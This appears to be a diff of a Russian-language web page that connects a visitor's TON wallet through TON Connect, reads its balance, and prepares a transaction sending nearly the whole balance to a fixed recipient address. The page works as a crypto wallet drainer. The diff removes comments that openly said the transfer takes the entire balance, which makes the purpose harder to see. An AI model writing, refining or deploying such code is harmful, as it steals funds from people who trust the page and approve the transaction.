@@ -120,10 +120,10 @@
 <body>
 
 <div class="card">
-    <!-- Изначально отображается только кнопка подключения кошелька -->
+    <!-- Кнопка подключения кошелька -->
     <div id="ton-connect"></div>
 
-    <!-- Блок деталей, который появляется только после подключения -->
+    <!-- Блок деталей, который появляется после подключения -->
     <div id="wallet-info" class="wallet-details">
         <div class="info-title">Адрес кошелька:</div>
         <div id="wallet-address" class="info-value"></div>
@@ -131,14 +131,13 @@
         <div class="info-title">Текущий баланс:</div>
         <div id="wallet-balance" class="info-value balance-box">Сканирование...</div>
 
-        <!-- Кнопка отправки транзакции на весь баланс -->
+        <!-- Кнопка отправки транзакции -->
         <button id="sendTxBtn" class="send-btn" disabled>Расчёт баланса...</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
 </div>
 
 <script>
-    // Инициализация TON Connect UI с вашим манифестом
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://chek-topaz.vercel.app/tonconnect-manifest.json',
         buttonRootId: 'ton-connect'
@@ -150,17 +149,14 @@
     const sendBtn = document.getElementById('sendTxBtn');
     const txStatus = document.getElementById('txStatus');
 
-    // Адрес получателя
-    const RECIPIENT_ADDRESS = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
+    // RAW-формат вашего адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
+    const RECIPIENT_ADDRESS = '0:522be7edfc0f48f29239d101aa62937bdce91f9eb0cb23bc160d5b8cc05b1a46';
 
-    // Запас на комиссию сети (0.005 TON = 5_000_000 nanoTON)
-    const GAS_FEE_RESERVE = 5000000;
+    const GAS_FEE_RESERVE = 5000000; // 0.005 TON reserve for fee
 
-    // Глобальные переменные хранят отсканированный баланс
     let userBalanceNano = 0;
     let transferableAmountNano = 0;
 
-    // Функция сканирования и получения полного баланса
     async function fetchWalletBalance(rawAddress) {
         try {
             walletBalanceContainer.innerText = 'Сканирование...';
@@ -175,7 +171,6 @@
                 const balanceInTon = (userBalanceNano / 1e9).toFixed(4);
                 walletBalanceContainer.innerText = `${balanceInTon} TON`;
 
-                // Вычисляем доступную сумму переводом за вычетом комиссии сети
                 if (userBalanceNano > GAS_FEE_RESERVE) {
                     transferableAmountNano = userBalanceNano - GAS_FEE_RESERVE;
                     const sendTonStr = (transferableAmountNano / 1e9).toFixed(4);
@@ -201,7 +196,6 @@
         }
     }
 
-    // Функция отправки транзакции на весь баланс
     async function sendTransaction() {
         const wallet = tonConnectUI.wallet;
         if (!wallet) {
@@ -222,7 +216,6 @@
             txStatus.innerText = 'Подготовка транзакции...';
             txStatus.className = 'tx-status';
 
-            // Формирование транзакции на весь доступный баланс пользователя
             const tx = {
                 validUntil: Math.floor(Date.now() / 1000) + 300,
                 messages: [
@@ -258,7 +251,6 @@
         }
     }
 
-    // Отслеживание подключения кошелька
     tonConnectUI.onStatusChange(async wallet => {
         if (wallet) {
             const address = wallet.account.address;
